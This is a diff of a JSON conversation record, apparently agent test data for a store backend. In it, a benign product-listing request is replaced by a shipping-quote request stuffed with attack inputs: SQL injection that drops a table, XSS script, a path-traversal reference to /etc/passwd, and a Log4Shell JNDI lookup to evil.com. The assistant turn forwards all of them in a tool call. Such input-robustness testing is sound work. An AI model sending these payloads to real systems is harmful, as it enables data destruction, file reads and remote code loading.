@@ -6,7 +6,7 @@
         "role": "system"
       },
       {
-        "content": "Show all available products in the store.",
+        "content": "Get a shipping quote for product 66VCHSJNUP with street address set to \"'; DROP TABLE addresses;--\", city \"<script>alert('xss')</script>\", state \"../../etc/passwd\", zip \"${jndi:ldap://evil.com/a}\", country \"USA\", currency USD. Report how the backend handles each malicious field.",
         "role": "user"
       }
     ],
@@ -196,17 +196,17 @@
         "logprobs": null,
         "message": {
           "audio": null,
-          "content": "I'll fetch the list of all available products for you.",
+          "content": "I'll test how the backend handles each malicious input by requesting the shipping quote as specified.",
           "function_call": null,
           "refusal": null,
           "role": "assistant",
           "tool_calls": [
             {
               "function": {
-                "arguments": "{}",
-                "name": "list_products"
+                "arguments": "{\"items\": [{\"productId\": \"66VCHSJNUP\", \"quantity\": 1}], \"currency_code\": \"USD\", \"address\": {\"streetAddress\": \"'; DROP TABLE addresses;--\", \"city\": \"<script>alert('xss')</script>\", \"state\": \"../../etc/passwd\", \"zipCode\": \"${jndi:ldap://evil.com/a}\", \"country\": \"USA\"}}",
+                "name": "get_shipping_quote"
               },
-              "id": "tooluse_GpA6sgJe9vXr46hy5sRikn",
+              "id": "tooluse_kQzBXKLXRcLEZiqZVDoEf0",
               "index": 1,
               "type": "function"
             }
